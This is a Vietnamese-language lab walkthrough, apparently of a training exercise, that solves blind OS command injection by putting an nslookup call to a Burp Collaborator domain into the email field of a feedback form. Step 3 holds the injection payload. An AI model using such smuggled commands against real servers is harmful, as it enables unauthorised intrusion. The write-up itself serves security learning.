# Lab 04: Blind OS Command Injection with Out-of-Band Interaction

## Mục tiêu
Xác nhận blind command injection bằng cách buộc server gửi truy vấn DNS ra Burp Collaborator.

## Đề bài
<img src="images/04_blind-oob-interaction-2026-04-20-02-44-28.png" width="760" />
<br><br>

## Bước 1: Tạo địa chỉ Collaborator
Trong Burp Collaborator, tạo payload domain:

```txt
0rsf0ys9hfaiz0nmf29g6rkrlir9fz3o.oastify.com
```

## Bước 2: Bắt request feedback
Mở form `Submit feedback`, submit và chặn request `POST /feedback/submit`.

<img src="images/04_blind-oob-interaction-2026-04-20-02-49-33.png" width="760" />
<br><br>

## Bước 3: Chèn payload OOB
Inject vào trường `email`:

```txt
ahihi@hihi.com||nslookup 0rsf0ys9hfaiz0nmf29g6rkrlir9fz3o.oastify.com||
```

Gửi request đã sửa:

<img src="images/04_blind-oob-interaction-2026-04-20-02-51-13.png" width="760" />
<br><br>

## Bước 4: Kiểm tra tương tác DNS
Quay lại tab Collaborator và `Poll now`. Nếu thấy bản ghi DNS hit vào payload domain, nghĩa là lệnh đã được thực thi trên server.

<img src="images/04_blind-oob-interaction-2026-04-20-02-52-30.png" width="760" />
<br><br>

<img src="images/04_blind-oob-interaction-2026-04-20-02-53-01.png" width="760" />
<br><br>

## Kết quả
Đã giải quyết lab bằng cách chèn `nslookup` vào trường `email` và xác nhận DNS interaction trong Burp Collaborator.
